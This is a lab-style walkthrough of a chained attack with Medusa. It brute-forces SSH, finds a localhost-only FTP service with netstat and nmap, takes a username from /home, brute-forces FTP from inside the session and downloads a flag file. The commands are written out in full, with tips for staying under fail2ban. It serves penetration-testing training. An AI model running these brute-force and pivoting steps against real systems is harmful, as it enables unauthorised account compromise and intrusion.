# Brute Forcing SSH and FTP with Medusa

This scenario demonstrates a chained attack: use Medusa to compromise SSH, then use internal access to discover and attack a secondary service. This mirrors real-world penetration testing methodology where gaining initial access is rarely the end goal.

***

## Phase 1: SSH Brute Force

```bash
medusa -h TARGET_IP \
       -n PORT \
       -u sshuser \
       -P 2023-200_most_used_passwords.txt \
       -M ssh \
       -t 3
```

The thread count of `-t 3` is deliberately conservative. SSH is not just a password check: each attempt negotiates a full cryptographic handshake, which is computationally expensive on both ends. Running too many threads against SSH will:

- Slow down the attack as the server struggles with concurrent handshakes
- Trigger `fail2ban` or similar intrusion prevention systems that monitor failed auth counts
- Potentially cause the SSH daemon to temporarily refuse new connections

A value of 3 to 5 is standard practice for SSH brute forcing on assessed targets.

***

## Phase 2: Internal Reconnaissance After Access

Once SSH credentials are found and a session is established:

```bash
ssh sshuser@TARGET_IP -p PORT
```

The first action inside is to identify other running services. Two tools serve this purpose:

```bash
# Quick view of listening ports
netstat -tulpn | grep LISTEN

# Nmap against localhost to confirm services and versions
nmap localhost
```

The `netstat` command output here is worth understanding in detail:

| Flag | Meaning |
|------|---------|
| `-t` | Show TCP connections |
| `-u` | Show UDP connections |
| `-l` | Show only listening sockets |
| `-p` | Show the process using each socket |
| `-n` | Show numeric addresses, no DNS resolution |

This reveals port 21 (FTP) listening on the local machine, which would not be visible from outside because it is bound to the internal interface only. This is a common pattern: administrators expose only SSH externally and run other services locally, assuming internal services are safe from attack. Pivoting through the SSH session bypasses that assumption entirely.

***

## Phase 3: Username Discovery via Filesystem

Before running the FTP brute force, a quick filesystem check reveals a username:

```bash
ls /home
# ftpuser
```

Finding a home directory with the username `ftpuser` is a reliable indicator that `ftpuser` is a valid system account. This is passive, noise-free intelligence gathering. No authentication attempts, no log entries, just reading a directory listing you already have permission to view.

***

## Phase 4: FTP Brute Force from Inside

Because the FTP service listens only on localhost, the Medusa command runs from within the SSH session, targeting `127.0.0.1`:

```bash
medusa -h 127.0.0.1 \
       -u ftpuser \
       -P 2020-200_most_used_passwords.txt \
       -M ftp \
       -t 5
```

FTP allows higher thread counts than SSH because it uses plain-text authentication with no cryptographic overhead. The server simply receives credentials, checks them against its database, and responds. This makes FTP significantly faster to brute force and also far more dangerous, since credentials are transmitted in clear text and are trivially interceptable by anyone with access to the network path.

***

## Phase 5: FTP Session and File Retrieval

```bash
ftp ftp://ftpuser:PASSWORD@localhost
```

Once inside the FTP session:

```
ftp> ls              # List directory contents
ftp> get flag.txt    # Download the file
ftp> exit            # Close the session
```

Then read locally:

```bash
cat flag.txt
```

***

## The Full Attack Chain Visualised

```
External Access
     |
     v
[SSH Brute Force] --> Medusa -M ssh
     |
     v
[SSH Session Established]
     |
     v
[Internal Recon] --> netstat / nmap localhost
     |
     v
[Discover FTP on port 21]
     |
     v
[Username Discovery] --> ls /home
     |
     v
[FTP Brute Force] --> Medusa -M ftp -h 127.0.0.1
     |
     v
[FTP Session] --> get flag.txt
```
